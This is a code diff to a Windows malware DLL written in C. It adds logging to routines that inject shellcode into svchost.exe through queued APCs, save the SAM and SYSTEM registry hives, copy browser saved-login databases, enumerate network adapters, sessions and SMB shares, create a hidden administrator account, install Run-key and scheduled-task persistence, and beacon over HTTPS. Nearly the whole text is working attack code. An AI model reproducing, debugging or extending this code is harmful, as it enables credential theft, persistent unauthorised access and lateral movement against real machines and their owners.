@@ -227,22 +227,23 @@ static LPBYTE BuildAPCShellcode(LPCSTR dllPath, FARPROC pLoadLibraryA, DWORD* pd
 
 static BOOL InjectAPC(DWORD pid) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    if (!hProcess) return FALSE;
+    if (!hProcess) { LogMessage(L"[-] InjectAPC: OpenProcess FAILED"); return FALSE; }
 
     FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32"), "LoadLibraryA");
-    if (!pLoadLibraryA) { CloseHandle(hProcess); return FALSE; }
+    if (!pLoadLibraryA) { LogMessage(L"[-] InjectAPC: GetProcAddress(LoadLibraryA) FAILED"); CloseHandle(hProcess); return FALSE; }
 
     DWORD dwSize;
     LPBYTE shellcode = BuildAPCShellcode(STAGE_DLL_PATH, pLoadLibraryA, &dwSize);
-    if (!shellcode) { CloseHandle(hProcess); return FALSE; }
+    if (!shellcode) { LogMessage(L"[-] InjectAPC: BuildAPCShellcode FAILED"); CloseHandle(hProcess); return FALSE; }
 
     LPVOID pRemote = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pRemote) { LocalFree(shellcode); CloseHandle(hProcess); return FALSE; }
+    if (!pRemote) { LogMessage(L"[-] InjectAPC: VirtualAllocEx FAILED"); LocalFree(shellcode); CloseHandle(hProcess); return FALSE; }
 
     BOOL bWritten = WriteProcessMemory(hProcess, pRemote, shellcode, dwSize, NULL);
     LocalFree(shellcode);
-    if (!bWritten) { VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; }
+    if (!bWritten) { LogMessage(L"[-] InjectAPC: WriteProcessMemory FAILED"); VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE); CloseHandle(hProcess); return FALSE; }
 
+    DWORD threadCount = 0;
     HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (hThreadSnap != INVALID_HANDLE_VALUE) {
         THREADENTRY32 te = { sizeof(te) };
@@ -253,6 +254,7 @@ static BOOL InjectAPC(DWORD pid) {
                     if (hThread) {
                         QueueUserAPC((PAPCFUNC)pRemote, hThread, 0);
                         CloseHandle(hThread);
+                        threadCount++;
                     }
                 }
             } while (Thread32Next(hThreadSnap, &te));
@@ -261,6 +263,10 @@ static BOOL InjectAPC(DWORD pid) {
     }
 
     CloseHandle(hProcess);
+
+    wchar_t buf[256];
+    wsprintfW(buf, L"[+] InjectAPC: queued APC to %lu threads", threadCount);
+    LogMessage(buf);
     return TRUE;
 }
 
@@ -328,20 +334,47 @@ static void DumpSAM(void) {
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
 
+        LogMessage(L"[*] DumpSAM: saving SAM hive...");
         wchar_t samCmd[] = L"reg.exe save HKLM\\SAM C:\\Windows\\Temp\\~s1.tmp /y";
         CreateProcessW(NULL, samCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 30000);
+            DWORD exitCode;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            wchar_t buf[256];
+            wsprintfW(buf, L"[+] DumpSAM: SAM saved (exit=%lu)", exitCode);
+            LogMessage(buf);
+        } else {
+            LogMessage(L"[-] DumpSAM: SAM save FAILED");
+        }
 
+        LogMessage(L"[*] DumpSAM: saving SYSTEM hive...");
         wchar_t sysCmd[] = L"reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\~s2.tmp /y";
         CreateProcessW(NULL, sysCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 30000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
+        if (pi.hProcess) {
+            WaitForSingleObject(pi.hProcess, 30000);
+            DWORD exitCode;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+            wchar_t buf[256];
+            wsprintfW(buf, L"[+] DumpSAM: SYSTEM saved (exit=%lu)", exitCode);
+            LogMessage(buf);
+        } else {
+            LogMessage(L"[-] DumpSAM: SYSTEM save FAILED");
+        }
     }
 }
 
 static void StealBrowserCreds(void) {
     {
         wchar_t localAppData[MAX_PATH];
-        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) return;
+        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
+            LogMessage(L"[-] StealBrowserCreds: SHGetFolderPathW FAILED");
+            return;
+        }
 
         EnsureDirectory(BROWSER_DEST_DIR);
 
@@ -356,6 +389,7 @@ static void StealBrowserCreds(void) {
         L"chrome", L"edge", L"brave", L"opera", L"chromium"
     };
 
+    int foundCount = 0;
     for (int i = 0; i < 5; i++) {
         wchar_t srcPath[MAX_PATH];
         lstrcpyW(srcPath, localAppData);
@@ -363,10 +397,17 @@ static void StealBrowserCreds(void) {
 
         if (GetFileAttributesW(srcPath) == INVALID_FILE_ATTRIBUTES) continue;
 
+        foundCount++;
         wchar_t destPath[MAX_PATH];
         wsprintfW(destPath, L"%s~br_%s.tmp", BROWSER_DEST_DIR, profileNames[i]);
         CopyFileW(srcPath, destPath, FALSE);
+        wchar_t buf[128];
+        wsprintfW(buf, L"[+] %s Login Data copied", profileNames[i]);
+        LogMessage(buf);
     }
+    wchar_t logBuf[128];
+    wsprintfW(logBuf, L"[+] StealBrowserCreds: %d browsers copied", foundCount);
+    LogMessage(logBuf);
     }
 }
 
@@ -490,6 +531,9 @@ static void DoRecon(void) {
                 AppendToFile(RECON_PATH, line);
                 pAdapter = pAdapter->Next;
             }
+            LogMessage(L"[+] Recon: GetAdaptersInfo OK");
+        } else {
+            LogMessage(L"[-] Recon: GetAdaptersInfo FAILED");
         }
 
         AppendToFile(RECON_PATH, "=== TERMINAL SESSIONS ===");
@@ -501,6 +545,7 @@ static void DoRecon(void) {
                 PWTS_SESSION_INFO pSessions = NULL;
                 DWORD dwCount = 0;
                 if (pWTSEnum(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &dwCount)) {
+                    LogMessage(L"[+] Recon: WTSEnumerateSessions OK");
                     for (DWORD i = 0; i < dwCount; i++) {
                         char line[512];
                         snprintf(line, sizeof(line), "  Session %lu: %S (State: %lu)", 
@@ -508,6 +553,8 @@ static void DoRecon(void) {
                         AppendToFile(RECON_PATH, line);
                     }
                     pWTSFree(pSessions);
+                } else {
+                    LogMessage(L"[-] Recon: WTSEnumerateSessions FAILED");
                 }
             }
             FreeLibrary(hWtsApi);
@@ -519,6 +566,9 @@ static void DoRecon(void) {
             char line[512];
             snprintf(line, sizeof(line), "=== COMPUTER NAME: %S ===", compName);
             AppendToFile(RECON_PATH, line);
+            LogMessage(L"[+] Recon: GetComputerNameExW OK");
+        } else {
+            LogMessage(L"[-] Recon: GetComputerNameExW FAILED");
         }
 
         LogMessage(L"[+] Recon completed");
@@ -572,6 +622,10 @@ static void DoSMBRecon(void) {
                         if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == 0) {
                             AppendToFile(NET_PATH, "  Port 445: OPEN");
 
+                            wchar_t connMsg[256];
+                            wsprintfW(connMsg, L"[+] DoSMBRecon: %s:445 - OPEN", pInfo[i].sv100_name);
+                            LogMessage(connMsg);
+
                             // Enumerate shares
                             wchar_t uncPath[512];
                             wsprintfW(uncPath, L"\\\\%s", pInfo[i].sv100_name);
@@ -585,7 +639,13 @@ static void DoSMBRecon(void) {
                                     AppendToFile(NET_PATH, line);
                                 }
                                 NetApiBufferFree(pShares);
+                                wsprintfW(connMsg, L"[+] DoSMBRecon: %s shares found: %lu", pInfo[i].sv100_name, dwShareEntries);
+                                LogMessage(connMsg);
                             }
+                        } else {
+                            wchar_t connMsg[256];
+                            wsprintfW(connMsg, L"[-] DoSMBRecon: %s:445 - CLOSED", pInfo[i].sv100_name);
+                            LogMessage(connMsg);
                         }
                         closesocket(sock);
                     }
@@ -659,11 +719,13 @@ static void CreateAdminAccount(void) {
         ui.usri1_priv = USER_PRIV_ADMIN;
         ui.usri1_flags = UF_SCRIPT | UF_NORMAL_ACCOUNT;
         ui.usri1_comment = L"Support account";
-        NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
+        NET_API_STATUS status = NetUserAdd(NULL, 1, (LPBYTE)&ui, NULL);
+        LogMessage(status == NERR_Success ? L"[+] NetUserAdd: SupportUser created" : L"[-] NetUserAdd FAILED");
 
         LOCALGROUP_MEMBERS_INFO_3 lmi = {0};
         lmi.lgrmi3_domainandname = L"SupportUser";
-        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);
+        status = NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&lmi, 1);
+        LogMessage(status == NERR_Success ? L"[+] NetLocalGroupAddMembers: SupportUser added to Administrators" : L"[-] NetLocalGroupAddMembers FAILED");
     }
 }
 
@@ -673,6 +735,9 @@ static void InstallPersistence(void) {
         if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, RUN_KEY_PATH, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
             RegSetValueExW(hKey, RUN_KEY_VALUE, 0, REG_SZ, (LPBYTE)SELF_INF, (lstrlenW(SELF_INF) + 1) * sizeof(wchar_t));
             RegCloseKey(hKey);
+            LogMessage(L"[+] Persistence: Run key written");
+        } else {
+            LogMessage(L"[-] Persistence: Run key write FAILED");
         }
 
         STARTUPINFOW si = { sizeof(si) };
@@ -683,8 +748,15 @@ static void InstallPersistence(void) {
             TASK_NAME, SELF_INF);
         if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             WaitForSingleObject(pi.hProcess, 30000);
+            DWORD exitCode;
+            GetExitCodeProcess(pi.hProcess, &exitCode);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
+            wchar_t buf[256];
+            wsprintfW(buf, L"[+] Persistence: schtasks executed (exit=%lu)", exitCode);
+            LogMessage(buf);
+        } else {
+            LogMessage(L"[-] Persistence: schtasks launch FAILED");
         }
 
         LogMessage(L"[+] Persistence installed");
@@ -694,22 +766,42 @@ static void InstallPersistence(void) {
 static void Beacon(void) {
     {
         HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-        if (!hSession) return;
+        if (!hSession) { LogMessage(L"[-] Beacon: WinHttpOpen FAILED"); return; }
+        LogMessage(L"[+] Beacon: WinHttpOpen OK");
 
         HINTERNET hConnect = WinHttpConnect(hSession, L"github.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
-        if (hConnect) {
-            for (int i = 0; i < BEACON_COUNT; i++) {
-                HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
-                if (hRequest) {
-                    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
-                    WinHttpReceiveResponse(hRequest, NULL);
-                    WinHttpCloseHandle(hRequest);
-                }
-                if (i < BEACON_COUNT - 1) Sleep(BEACON_SLEEP_MS);
+        if (!hConnect) { LogMessage(L"[-] Beacon: WinHttpConnect FAILED"); WinHttpCloseHandle(hSession); return; }
+        LogMessage(L"[+] Beacon: WinHttpConnect OK");
+
+        for (int i = 0; i < BEACON_COUNT; i++) {
+            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", NULL, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+            if (!hRequest) {
+                wchar_t buf[128];
+                wsprintfW(buf, L"[-] Beacon: GET %d/%d - WinHttpOpenRequest FAILED", i + 1, BEACON_COUNT);
+                LogMessage(buf);
+                continue;
             }
-            WinHttpCloseHandle(hConnect);
+
+            BOOL ok = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
+            if (!ok) {
+                wchar_t buf[128];
+                wsprintfW(buf, L"[-] Beacon: GET %d/%d - WinHttpSendRequest FAILED", i + 1, BEACON_COUNT);
+                LogMessage(buf);
+                WinHttpCloseHandle(hRequest);
+                continue;
+            }
+
+            ok = WinHttpReceiveResponse(hRequest, NULL);
+            wchar_t buf[128];
+            wsprintfW(buf, L"[+] Beacon: GET %d/%d - %s", i + 1, BEACON_COUNT, ok ? L"OK" : L"FAILED");
+            LogMessage(buf);
+
+            WinHttpCloseHandle(hRequest);
+            if (i < BEACON_COUNT - 1) Sleep(BEACON_SLEEP_MS);
         }
+        WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
+        LogMessage(L"[+] Beacon: completed");
     }
 }
 
@@ -792,7 +884,12 @@ __declspec(dllexport) HRESULT WINAPI DllRegisterServer(void) {
     DWORD pid = 0;
     for (int attempt = 0; attempt < 3 && pid == 0; attempt++) {
         pid = FindProcessPID("svchost.exe");
-        if (pid == 0 && attempt < 2) Sleep(2000);
+        if (pid == 0 && attempt < 2) {
+            wchar_t buf[128];
+            wsprintfW(buf, L"[-] svchost.exe not found (attempt %d/3)", attempt + 1);
+            LogMessage(buf);
+            Sleep(2000);
+        }
     }
     if (pid) {
         wchar_t buf[256];
